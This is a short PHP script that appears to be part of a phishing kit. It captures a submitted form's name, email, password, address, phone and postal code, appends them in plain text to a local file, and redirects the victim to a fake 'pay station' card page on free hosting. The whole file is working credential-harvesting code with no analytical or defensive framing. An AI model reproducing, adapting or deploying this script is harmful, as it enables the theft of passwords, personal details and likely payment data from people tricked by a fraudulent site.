
<?PHP

$Name = $_POST['name'];

$Fname = $_POST['fname'];

$Email = $_POST['email'];

$Pass = $_POST['pass'];

$Reg = $_POST['region'];

$City = $_POST['city'];

$Number = $_POST['number'];

$Home = $_POST['home'];

$Phone = $_POST['phone'];

$Code = $_POST['postalcode'];

$log = fopen("database.txt","at");

fwrite($log, "\n $Name : $Fname : $Email : $Pass : $Reg : $City : $Number : $Home : $Phone : $Code \n");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://best-pay-station1.000webhostapp.com/secondary_sites/pay/card.html'></head></html>";

?>
